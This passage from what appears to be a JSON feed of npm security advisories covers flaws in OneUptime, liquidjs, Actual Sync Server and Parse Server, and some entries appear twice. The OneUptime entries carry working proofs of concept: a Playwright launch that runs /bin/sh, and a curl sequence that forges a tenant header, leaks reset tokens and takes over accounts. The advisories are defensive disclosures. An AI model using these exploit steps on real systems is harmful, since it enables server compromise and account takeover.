malicious Synthetic Monitor can do this from inside the sandboxed script:</p>\n<pre><code class=\"language-javascript\">browser.browserType().launch({\n  executablePath: \"/bin/sh\",\n  ignoreDefaultArgs: true,\n  args: [\"-c\", \"id\"],\n});\n</code></pre>\n<p>Even if Playwright later throws because the spawned process is not a real browser, the command has already executed.</p>\n<p>This execution path is reachable through both one-shot monitor testing and normal scheduled monitor execution:</p>\n<ul>\n<li>Monitor tests fetched by the probe: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchMonitorTest.ts#L55-L85\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchMonitorTest.ts#L55-L85</a></li>\n<li>Scheduled monitor execution: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchList.ts#L96-L126\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Jobs/Monitor/FetchList.ts#L96-L126</a></li>\n</ul>\n<p>This appears distinct from prior <code>node:vm</code> breakout issues because the exploit does not need to recover <code>process</code> from the VM. The dangerous capability is already exposed by design through the injected Playwright object.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Log in to the dashboard as a regular project member.</li>\n<li>Go to <code>Monitors</code> -&gt; <code>Create New Monitor</code>.</li>\n<li>Select <code>Synthetic Monitor</code>.</li>\n<li>In the Playwright code field, paste:</li>\n</ol>\n<pre><code class=\"language-javascript\"> browser.browserType().launch({\n    executablePath: \"/bin/sh\",\n    ignoreDefaultArgs: true,\n    args: [\n      \"-c\",\n      \"id\"\n    ],\n    timeout: 1000,\n  }).catch((err) =&gt; {\n    console.log(String(err));\n  });\n\n  return {\n    data: {\n      launched: true\n    }\n  };\n</code></pre>\n<ol start=\"5\">\n<li>Select one browser type, for example <code>Chromium</code>.</li>\n<li>Select one screen type, for example <code>Desktop</code>.</li>\n<li>Set retry count to <code>0</code>.</li>\n<li>Click <code>Test Monitor</code> and choose any probe.</li>\n</ol>\n<p>Expected result:</p>\n<ul>\n<li>the monitor execution succeeded and in the Show More Details the command output is shown.<img width=\"1537\" height=\"220\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4fa5b458-cae9-4ec8-add0-bfc288ee7568\"></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a server-side Remote Code Execution issue affecting the probe component.</p>\n<p>Who is impacted:</p>\n<ul>\n<li>any OneUptime deployment where an attacker can obtain ordinary project membership</li>\n<li>environments where the probe has access to internal services, secrets, Kubernetes metadata, database credentials, proxy credentials, or other cluster-local trust relationships</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OneUptime/oneuptime/security/advisories/GHSA-jw8q-gjvg-8w4q\">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-jw8q-gjvg-8w4q</a></li>\n<li><a href=\"https://github.com/OneUptime/oneuptime/releases/tag/10.0.21\">https://github.com/OneUptime/oneuptime/releases/tag/10.0.21</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30957\">https://nvd.nist.gov/vuln/detail/CVE-2026-30957</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jw8q-gjvg-8w4q\">https://github.com/advisories/GHSA-jw8q-gjvg-8w4q</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:45:14.000Z",
+          "date_published": "2026-03-10T01:12:59.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-jw8q-gjvg-8w4q"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "7cde1fcf3e8c67ea0804bc66f5e97777",
+        "url": "https://github.com/advisories/GHSA-r5v6-2599-9g3m",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@oneuptime/common] OneUptime has authorization bypass via client‑controlled is-multi-tenant-query header that leads to cross‑tenant data exposure and account takeover",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-r5v6-2599-9g3m"
+          ],
+          "content_hash": "sha256:ce51e7c40caf4a5067aa459257647fafe7a537ebd03a5ea9a9109b32e60d39af"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A low‑privileged user can bypass authorization and tenant isolation in OneUptime <code>v10.0.20</code> by sending a forged <code>is-multi-tenant-query</code> header together with a controlled <code>projectid</code> header.</p>\n<p>Because the server trusts this client-supplied header, internal permission checks in <code>BasePermission</code> are skipped and tenant scoping is disabled.</p>\n<p>This allows attackers to:</p>\n<ol>\n<li>Access project data belonging to other tenants</li>\n<li>Read sensitive User fields via nested relations</li>\n<li>Leak plaintext resetPasswordToken</li>\n<li>Reset the victim’s password and fully take over the account</li>\n</ol>\n<p>This results in cross‑tenant data exposure and full account takeover.</p>\n<h3 id=\"details\">Details</h3>\n<p>Root cause</p>\n<p>The API trusts a client‑controlled header to determine whether a request should bypass authorization checks.</p>\n<p>CommonAPI.ts</p>\n<pre><code>if (req.headers[\"is-multi-tenant-query\"]) {\n  props.isMultiTenantRequest = true;\n}\n</code></pre>\n<p>BasePermission.ts</p>\n<pre><code>if (!props.isMultiTenantRequest) {\n  TablePermission.checkTableLevelPermissions(...)\n  QueryPermission.checkQueryPermission(...)\n  SelectPermission.checkSelectPermission(...)\n}\n</code></pre>\n<p>When the attacker sends:</p>\n<pre><code>is-multi-tenant-query: true\n</code></pre>\n<p>the system skips all authorization checks including:</p>\n<ul>\n<li>Table permission validation</li>\n<li>Query permission validation</li>\n<li>Select permission validation</li>\n<li>Tenant isolation enforcement</li>\n</ul>\n<p>Additionally, tenant scoping is disabled in <code>TenantPermission</code></p>\n<p>Sensitive user data exposure</p>\n<p>Projects marked with:</p>\n<pre><code>@MultiTenentQueryAllowed(true)\n</code></pre>\n<p>allow cross-tenant queries when the header is present.</p>\n<p>The Project model contains a relation:</p>\n<pre><code>createdByUser\n</code></pre>\n<p>Because select permission checks are skipped, attackers can retrieve sensitive fields from the User model including:</p>\n<pre><code>password\nresetPasswordToken\nwebauthnChallenge\n</code></pre>\n<p>Reset token stored in plaintext</p>\n<p>In the password reset flow:</p>\n<p>Authentication.ts</p>\n<pre><code>resetPasswordToken: token\n</code></pre>\n<p>The reset token is stored in plaintext in the database.</p>\n<p>During password reset:</p>\n<pre><code>/api/identity/reset-password\n</code></pre>\n<p>the server validates the provided token directly.</p>\n<p>If an attacker leaks this token through the authorization bypass, they can immediately reset the victim’s password.</p>\n<p>Exploitation chain</p>\n<ol>\n<li>Attacker bypasses tenant isolation using is-multi-tenant-query</li>\n<li>Attacker reads victim project</li>\n<li>Attacker selects createdByUser.resetPasswordToken</li>\n<li>Attacker triggers forgot-password for victim</li>\n<li>Attacker retrieves the fresh token via the same query</li>\n<li>Attacker calls /api/identity/reset-password</li>\n<li>Attacker sets a new password</li>\n<li>Attacker logs in as victim</li>\n</ol>\n<p>This results in full account takeover.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><strong>Setup:</strong></p>\n<ul>\n<li>Local OneUptime v10.0.20 instance</li>\n<li>Two normal accounts:<ul>\n<li>Attacker account owns Project A (<code>7cb77c45-c2e0-42b5-8a28-57aa0dec6e82</code>)</li>\n<li>Victim account owns Project B (<code>88ced36b-4c0a-4c12-bdf1-497d60b10b23</code>) with email <code>victim@example.com</code></li>\n</ul>\n</li>\n</ul>\n<hr>\n<h4 id=\"chain-1-direct-project-isolation-bypass\">Chain 1: Direct Project Isolation Bypass</h4>\n<p><strong>1. Read isolation bypass</strong></p>\n<pre><code class=\"language-bash\">curl -X POST http://localhost/api/project/get-list \\\n  -H \"authorization: Bearer &lt;attacker_token&gt;\" \\\n  -H \"projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82\" \\\n  -H \"is-multi-tenant-query: true\" \\\n  -H \"content-type: application/json\" \\\n  -d '{\n        \"query\": {},\n        \"select\": {\n            \"_id\": true,\n            \"name\": true,\n            \"createdOwnerEmail\": true\n        }\n      }'\n</code></pre>\n<p>Result: Returns both the attacker's and victim's projects:</p>\n<pre><code class=\"language-json\">{\n  \"data\": [\n    {\n      \"_id\": \"88ced36b-4c0a-4c12-bdf1-497d60b10b23\",\n      \"name\": \"Victim Project\",\n      \"createdOwnerEmail\": { \"value\": \"victim@example.com\" }\n    },\n    {\n      \"_id\": \"7cb77c45-c2e0-42b5-8a28-57aa0dec6e82\",\n      \"name\": \"Attacker Project\",\n      \"createdOwnerEmail\": { \"value\": \"attacker@example.com\" }\n    }\n  ],\n  \"count\": 2\n}\n</code></pre>\n<ol start=\"2\">\n<li>Write isolation bypass</li>\n</ol>\n<p>Victim project name is initially: Victim Project ORIGINAL</p>\n<pre><code>curl -X POST http://localhost/api/project/88ced36b-4c0a-4c12-bdf1-497d60b10b23/update-item \\\n  -H \"authorization: Bearer &lt;attacker_token&gt;\" \\\n  -H \"projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82\" \\\n  -H \"is-multi-tenant-query: true\" \\\n  -H \"content-type: application/json\" \\\n  -d '{\"name\":\"Victim Project EXPLOIT\"}'\n</code></pre>\n<p>Result: Victim project name is updated to \"Victim Project EXPLOIT\" despite the attacker not being a member of the victim project.</p>\n<h4 id=\"chain-2-account-takeover-via-credential-leakage\">Chain 2: Account Takeover via Credential Leakage</h4>\n<ol start=\"3\">\n<li>Trigger password reset for victim</li>\n</ol>\n<pre><code>curl -X POST http://localhost/api/identity/forgot-password \\\n  -H \"content-type: application/json\" \\\n  -d \"{\\\"email\\\":\\\"victim@example.com\\\"}\"\n</code></pre>\n<ol start=\"4\">\n<li>Leak victim password hash and reset token via tenant bypass</li>\n</ol>\n<pre><code>curl -X POST http://localhost/api/project/get-list \\\n  -H \"authorization: Bearer &lt;attacker_token&gt;\" \\\n  -H \"projectid: 7cb77c45-c2e0-42b5-8a28-57aa0dec6e82\" \\\n  -H \"is-multi-tenant-query: true\" \\\n  -H \"content-type: application/json\" \\\n  -d '{\n        \"query\": {\"_id\": \"88ced36b-4c0a-4c12-bdf1-497d60b10b23\"},\n        \"select\": {\n          \"_id\": true,\n          \"createdByUser\": {\n            \"email\": true,\n            \"password\": true,\n            \"resetPasswordToken\": true\n          }\n        }\n      }'\n</code></pre>\n<p>Result: Sensitive user data is exposed:</p>\n<pre><code>{\n  \"data\": [{\n    \"_id\": \"88ced36b-4c0a-4c12-bdf1-497d60b10b23\",\n    \"createdByUser\": {\n      \"email\": {\"value\": \"victim@example.com\"},\n      \"password\": {\"value\": \"faef08e8f2b9e9dfa09c15dfaf043b8aad7761d9712c7e09417d4da2156e33d9\"},\n      \"resetPasswordToken\": \"4b75e6d0-1aca-11f1-b2d4-698549b693fb\"\n    }\n  }]\n}\n</code></pre>\n<ol start=\"5\">\n<li>Take over victim account using leaked token</li>\n</ol>\n<pre><code># Reset password with leaked token\ncurl -X POST http://localhost/api/identity/reset-password \\\n  -H \"content-type: application/json\" \\\n  -d '{\n    \"resetPasswordToken\": \"4b75e6d0-1aca-11f1-b2d4-698549b693fb\",\n    \"password\": \"AttackerChosenPassword123!\"\n  }'\n\n# Login as victim with new password\ncurl -X POST http://localhost/api/identity/login \\\n  -H \"content-type: application/json\" \\\n  -d '{\n    \"email\": \"victim@example.com\",\n    \"password\": \"AttackerChosenPassword123!\"\n  }'\n</code></pre>\n<p>Result: Successful login with attacker-chosen password, original password fails - complete account takeover achieved.</p>\n<p>Result: Victim project name is updated despite the attacker not being a member of the victim project.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows a low‑privileged authenticated user to:</p>\n<ul>\n<li>bypass tenant isolation</li>\n<li>access other tenant projects</li>\n<li>read sensitive user credential fields</li>\n<li>leak plaintext reset tokens</li>\n<li>reset victim passwords</li>\n<li>fully take over victim accounts</li>\n</ul>\n<p>Because OneUptime is a multi‑tenant monitoring platform, this allows attackers to compromise any tenant account in the system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OneUptime/oneuptime/security/advisories/GHSA-r5v6-2599-9g3m\">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-r5v6-2599-9g3m</a></li>\n<li><a href=\"https://github.com/OneUptime/oneuptime/releases/tag/10.0.21\">https://github.com/OneUptime/oneuptime/releases/tag/10.0.21</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30956\">https://nvd.nist.gov/vuln/detail/CVE-2026-30956</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5v6-2599-9g3m\">https://github.com/advisories/GHSA-r5v6-2599-9g3m</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:45:04.000Z",
+          "date_published": "2026-03-10T01:09:40.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-r5v6-2599-9g3m"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "fb862e247a31beb91312d8a0adbdb10f",
+        "url": "https://github.com/advisories/GHSA-wmfp-5q7x-987x",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[liquidjs] liquidjs has a path traversal fallback vulnerability",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-wmfp-5q7x-987x"
+          ],
+          "content_hash": "sha256:04e5aee17cf3bc592c637ab49165a3e10d8e553476d7c6224c807ca60a89a0a1"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>layout</code>, <code>render</code>, and <code>include</code> tags allow arbitrary file access via absolute paths (either as string literals or through Liquid variables when <code>dynamicPartials: true</code> is enabled). This poses a security risk when malicious users are allowed to control the template content or specify the filepath to be included as a Liquid variable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue is fixed via <a href=\"https://github.com/harttle/liquidjs/pull/855\">#855</a> and published version 10.25.0 on npm.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<h4 id=\"change-the-files-in-build-time\">Change the files in build time</h4>\n<p>In build time, through Shell script or Webpack <code>string-replace-loader</code>, change the file content of correxponding file (depending on your package <code>type</code>, for CommonJS it's <code>dist/liquid.node.js</code>) under <code>dist/</code>, </p>\n<pre><code class=\"language-diff\">  if (fs.fallback !== undefined) {\n    const filepath = fs.fallback(file)\n-   if (filepath !== undefined) yield filepath\n+   if (filepath !== undefined) {\n+     for (const dir of dirs) {\n+       if (!enforceRoot || this.contains(dir, filepath)) {\n+         yield filepath\n+         break\n+       }\n+     }\n    }\n  }\n</code></pre>\n<h4 id=\"overriding-by-fs-liquidjs-option\">Overriding by <code>fs</code> LiquidJS option</h4>\n<p>Adding a <a href=\"https://liquidjs.com/api/interfaces/FS.html\"><code>fs</code> option</a> to override the <a href=\"https://github.com/harttle/liquidjs/blob/1b85fdaa9c535021f7030a239a64003af26d31b5/src/fs/fs-impl.ts#L36-L40\">default <code>fs</code> implementation</a>:</p>\n<pre><code class=\"language-javascript\">const { statSync, readFileSync, promises: { stat, readFile } } = require('fs')\nconst { resolve, extname, dirname, sep } = require('path')\n\nconst fs = {\n    exists: async (fp) =&gt; { try { await stat(fp); return true; } catch { return false } },\n    existsSync: (fp) =&gt; { try { statSync(fp); return true } catch { return false } },\n    resolve: (root, file, ext) =&gt; resolve(root, file + (extname(file) ? '' : ext)),\n    contains: (root, file) =&gt; {\n        const r = resolve(root)\n        return file.startsWith(r.endsWith(sep) ? r : r + sep)\n    },\n    readFile: (fp) =&gt; readFile(fp, 'utf8'),\n    readFileSync: (fp) =&gt; readFileSync(fp, 'utf8'),\n    fallback: () =&gt; undefined,\n    dirname,\n    sep\n};\n\nconst engine = new Liquid({ fs })\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>Discussions: <a href=\"https://github.com/harttle/liquidjs/pull/851\">https://github.com/harttle/liquidjs/pull/851</a>\nCode fix: <a href=\"https://github.com/harttle/liquidjs/pull/855\">https://github.com/harttle/liquidjs/pull/855</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/harttle/liquidjs/security/advisories/GHSA-wmfp-5q7x-987x\">https://github.com/harttle/liquidjs/security/advisories/GHSA-wmfp-5q7x-987x</a></li>\n<li><a href=\"https://github.com/harttle/liquidjs/pull/851\">https://github.com/harttle/liquidjs/pull/851</a></li>\n<li><a href=\"https://github.com/harttle/liquidjs/pull/855\">https://github.com/harttle/liquidjs/pull/855</a></li>\n<li><a href=\"https://github.com/harttle/liquidjs/commit/3cd024d652dc883c46307581e979fe32302adbac\">https://github.com/harttle/liquidjs/commit/3cd024d652dc883c46307581e979fe32302adbac</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30952\">https://nvd.nist.gov/vuln/detail/CVE-2026-30952</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wmfp-5q7x-987x\">https://github.com/advisories/GHSA-wmfp-5q7x-987x</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T22:55:55.000Z",
+          "date_published": "2026-03-10T01:04:34.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-wmfp-5q7x-987x"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "4262f6de03956726b36b3d7a80d5bb34",
+        "url": "https://github.com/advisories/GHSA-27vg-33gh-4hwg",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@actual-app/sync-server] Actual Sync Server has an Authenticated Path Traversal",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-27vg-33gh-4hwg"
+          ],
+          "content_hash": "sha256:329a929614b06de65e018421ae3c3b77e67df7f3c44c4fb716f6bde3d0133428"
+        },
+        "source_payload": {
+          "content_html": "<h1 id=\"description\">Description</h1>\n<p>Actual Sync Server allows authenticated users to upload files through <code>POST /sync/upload-user-file</code>. In versions prior to 26.3.0, improper validation of the user-controlled <code>x-actual-file-id</code> header means that traversal segments (<code>../</code>) can escape the intended directory and write files outside <code>userFiles</code>.</p>\n<h2 id=\"mitigations\">Mitigations</h2>\n<p>The vulnerability can be mitigated in prior versions by running the sync server in a filesystem sandbox.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/actualbudget/actual/security/advisories/GHSA-27vg-33gh-4hwg\">https://github.com/actualbudget/actual/security/advisories/GHSA-27vg-33gh-4hwg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-3089\">https://nvd.nist.gov/vuln/detail/CVE-2026-3089</a></li>\n<li><a href=\"https://github.com/actualbudget/actual/pull/7067\">https://github.com/actualbudget/actual/pull/7067</a></li>\n<li><a href=\"https://github.com/actualbudget/actual/commit/18072e1d8b5281db43ded8b21433ee177bae9dfa\">https://github.com/actualbudget/actual/commit/18072e1d8b5281db43ded8b21433ee177bae9dfa</a></li>\n<li><a href=\"https://fluidattacks.com/advisories/fugue\">https://fluidattacks.com/advisories/fugue</a></li>\n<li><a href=\"https://github.com/actualbudget/actual\">https://github.com/actualbudget/actual</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-27vg-33gh-4hwg\">https://github.com/advisories/GHSA-27vg-33gh-4hwg</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T01:02:16.000Z",
+          "date_published": "2026-03-10T01:02:15.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-27vg-33gh-4hwg"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "acfafa3231c3d8910dd7e243917c215d",
+        "url": "https://github.com/advisories/GHSA-5j86-7r7m-p8h6",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server has Denial of Service (DoS) and Cloud Function Dispatch Bypass via Prototype Chain Resolution",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-5j86-7r7m-p8h6"
+          ],
+          "content_hash": "sha256:519c5d77b8f6065515b06641c07a5d95271e328f48ab152a9447a384dd5d178a"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An unauthenticated attacker can crash the Parse Server process by calling a Cloud Function endpoint with a prototype property name as the function name. The server recurses infinitely, causing a call stack size error that terminates the process.</p>\n<p>Other prototype property names bypass Cloud Function dispatch validation and return HTTP 200 responses, even though no such Cloud Functions are defined. The same applies to dot-notation traversal.</p>\n<p>All Parse Server deployments that expose the Cloud Function endpoint are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The internal handler registries for Cloud Functions, Jobs, Triggers, and Validators have been changed to prevent prototype chain properties from being resolved.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Place a reverse proxy or WAF in front of Parse Server and block requests to <code>Object.prototype</code> property names.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.13\">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.13\">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30939\">https://nvd.nist.gov/vuln/detail/CVE-2026-30939</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5j86-7r7m-p8h6\">https://github.com/advisories/GHSA-5j86-7r7m-p8h6</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:44:54.000Z",
+          "date_published": "2026-03-10T00:57:57.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-5j86-7r7m-p8h6"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "acfafa3231c3d8910dd7e243917c215d",
+        "url": "https://github.com/advisories/GHSA-5j86-7r7m-p8h6",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server has Denial of Service (DoS) and Cloud Function Dispatch Bypass via Prototype Chain Resolution",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-5j86-7r7m-p8h6"
+          ],
+          "content_hash": "sha256:519c5d77b8f6065515b06641c07a5d95271e328f48ab152a9447a384dd5d178a"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An unauthenticated attacker can crash the Parse Server process by calling a Cloud Function endpoint with a prototype property name as the function name. The server recurses infinitely, causing a call stack size error that terminates the process.</p>\n<p>Other prototype property names bypass Cloud Function dispatch validation and return HTTP 200 responses, even though no such Cloud Functions are defined. The same applies to dot-notation traversal.</p>\n<p>All Parse Server deployments that expose the Cloud Function endpoint are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The internal handler registries for Cloud Functions, Jobs, Triggers, and Validators have been changed to prevent prototype chain properties from being resolved.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Place a reverse proxy or WAF in front of Parse Server and block requests to <code>Object.prototype</code> property names.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.13\">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6\">https://github.com/parse-community/parse-server/security/advisories/GHSA-5j86-7r7m-p8h6</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.13\">https://github.com/parse-community/parse-server/releases/tag/8.6.13</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30939\">https://nvd.nist.gov/vuln/detail/CVE-2026-30939</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5j86-7r7m-p8h6\">https://github.com/advisories/GHSA-5j86-7r7m-p8h6</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:44:54.000Z",
+          "date_published": "2026-03-10T00:57:57.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-5j86-7r7m-p8h6"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "efe1bf7a4819cb6326a9fedeac9991d7",
+        "url": "https://github.com/advisories/GHSA-q342-9w2p-57fp",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server has denylist `requestKeywordDenylist` keyword scan bypass through nested object placement",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-q342-9w2p-57fp"
+          ],
+          "content_hash": "sha256:67b76a7d789f125162828e44c12cd63f25edb1795f326e98bd302e56ffffaa28"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>requestKeywordDenylist</code> security control can be bypassed by placing any nested object or array before a prohibited keyword in the request payload. This is caused by a logic bug that stops scanning sibling keys after encountering the first nested value. Any custom <code>requestKeywordDenylist</code> entries configured by the developer are equally by-passable using the same technique.</p>\n<p>All Parse Server deployments are affected. The <code>requestKeywordDenylist</code> is enabled by default.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix replaces the recursive object scanner with an iterative stack-based traversal that processes all nested values without prematurely exiting the scan loop. This also eliminates a potential stack overflow on deeply nested payloads.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use a Cloud Code <code>beforeSave</code> trigger to validate incoming data for prohibited keywords across all classes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp\">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.12\">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp\">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.12\">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30938\">https://nvd.nist.gov/vuln/detail/CVE-2026-30938</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q342-9w2p-57fp\">https://github.com/advisories/GHSA-q342-9w2p-57fp</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:44:49.000Z",
+          "date_published": "2026-03-10T00:57:37.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-q342-9w2p-57fp"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "efe1bf7a4819cb6326a9fedeac9991d7",
+        "url": "https://github.com/advisories/GHSA-q342-9w2p-57fp",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server has denylist `requestKeywordDenylist` keyword scan bypass through nested object placement",
